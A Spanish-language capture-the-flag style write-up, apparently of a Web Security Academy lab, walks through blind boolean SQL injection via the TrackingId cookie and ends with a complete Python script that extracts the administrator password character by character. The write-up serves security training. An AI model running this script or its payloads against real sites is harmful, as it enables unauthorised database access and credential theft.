En este laboratorio se nos pide encontrar la contraseña del usuario `administrator` que se encuentra en la tabla `users` con las columnas `username` y `password`

Lo primero que hacemos al tramitar las primeras peticiones es darnos cuenta que la aplicación cuando devuelve una respuesta positiva nos lo demuestra incluyendo en la respuesta el mensaje de *Welcome Back!*![[Pasted image 20261029204801.png]]

En esta petición también nos damos cuenta de que hay una cabecera de `Cookie` en la que hay un identificador llamado `TrackingId` vamos a comprobar si este campo es un campo inyectable introduciendo una orden booleana en la que se iguale esta a una operación numérica
![[Pasted image 20261029205050.png]]

Al hacer `1=2` no recibimos ese mensaje de *Welcome back!* pero a la hora de igualar `1=1` si que obtenemos esta respuesta
![[Pasted image 20261029205333.png]]

Ahora ya sabemos que 110% es una inyeccion booleana, como conocemos el nombre de la tabla, sus columnas y el nombre del usuario que buscamos vamos a conseguri la password
![[Pasted image 20261029205531.png]]

Probamos con las letras del abecedario y descubrimos que la letra final no es mayor a la letra `g`
![[Pasted image 20261029205706.png]]

Y que la primera letra es mayor a `a` en orden alfabéticamente, ahora debremos de saber cual es la primera coincidencia 
![[Pasted image 20261029210426.png]]

Encontramos que la primera coincidencia es la letra `h`, como las contraseñas pueden ser muy largas vamos a crear un pequeño script que nos permita descifrar la contraseña automáticamente.
Antes podemos determinar la longitud de la contraseña usando
```sql
`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
```
La herramienta que hemos creado se llama `AutoDetectBlindSQLResponse.py`
```python
import requests

import string

  

# VARIABLES

URL =  "https://0adb005b0427313d8271973b00470060.web-security-academy.net/" # Modify to adapt

PARAM = "UFP2F6cCIpkHxnj1" # Modify to adapt

TABLE_NAME = "users" # Modify to adapt

COLUMS_NAME = ["username", "password"] # Modify to adapt

SESSION_COOKIE = "Mfiv4jcX8yVhCuExGYYc8LvVRsnA6H28" # Modify to adapt

  

# FUNCTIONS

  

#Recibe una condicion SQL, contruye el payload y manda la peticion recibiendo TRUE/FALSE dependiendo si incluye "Welcome back!"

def init_action(sql_condition):

    payload = f"{PARAM}' AND  {sql_condition}--"

    cookies = {

        "TrackingId": payload,

        "session": SESSION_COOKIE

        }

    r = requests.get(URL, cookies=cookies)

    return "Welcome back!" in r.text

  

# Prepara la lista de caracteres alfanumericos a probar en la inyeccion

def char_extract(position):

    posible_char = string.ascii_lowercase + string.digits

    for c in posible_char:

        condition = f"SUBSTRING((SELECT {COLUMS_NAME[1]} FROM {TABLE_NAME} WHERE {COLUMS_NAME[0]} = 'administrator'), {position}, 1) = '{c}'"

        if init_action(condition):

            return c

    return None

  

# Recorre todas las posicions desde el 1 al 33 en el SUBSTRING por cada poscion llama a char_extract y si este responde None asumimos que hay acaba la contraseña y para

def password_extract(max_length=32):

    result = ""

    for pos in range(1, max_length + 1):

        c = char_extract(pos)

        if c is None:

            print(f"Stoping, no more characters in position {pos}.")

            break

        result +=c

        print(f"Position {pos}: '{c}' -> {result}")

    return result

# MAIN

if __name__=="__main__":

    password = password_extract()

    print("Final password:", password)
```
